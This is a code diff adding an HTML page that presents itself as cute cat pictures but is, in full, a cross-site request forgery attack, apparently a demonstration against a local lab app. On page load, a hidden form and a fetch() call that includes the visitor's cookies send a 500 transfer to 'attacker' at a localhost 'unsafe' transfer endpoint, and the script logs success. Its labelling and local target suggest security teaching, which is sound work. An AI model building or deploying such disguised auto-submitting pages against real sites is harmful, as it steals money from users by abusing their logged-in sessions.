@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Cute Cats!</title>
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                max-width: 800px;
+                margin: 0 auto;
+                padding: 20px;
+            }
+            .cat-image {
+                max-width: 100%;
+                border-radius: 10px;
+                margin: 20px 0;
+            }
+        </style>
+    </head>
+    <body>
+        <h1>Adorable Cat Pictures!</h1>
+
+        <!-- Hidden malicious form -->
+        <form
+            id="csrf-form"
+            action="http://localhost:3000/api/unsafe/transfer"
+            method="POST"
+            style="display: none"
+        >
+            <input type="hidden" name="to" value="attacker" />
+            <input type="hidden" name="amount" value="500" />
+        </form>
+
+        <img
+            src="https://placekitten.com/800/400"
+            alt="Cute cat"
+            class="cat-image"
+        />
+
+        <p>
+            While you're looking at this cute cat, the hidden form is attempting
+            to transfer money from your account!
+        </p>
+
+        <script>
+            // Automatically submit the form when page loads
+            window.onload = () => {
+                // Using fetch to demonstrate the attack
+                fetch('http://localhost:3000/api/unsafe/transfer', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    credentials: 'include', // Important: includes cookies
+                    body: JSON.stringify({
+                        to: 'attacker',
+                        amount: 500,
+                    }),
+                })
+                    .then(response => {
+                        if (response.ok) {
+                            console.log('CSRF attack successful!')
+                        }
+                    })
+                    .catch(error => {
+                        console.log('CSRF attack failed:', error)
+                    })
+            }
+        </script>
+    </body>
+</html>
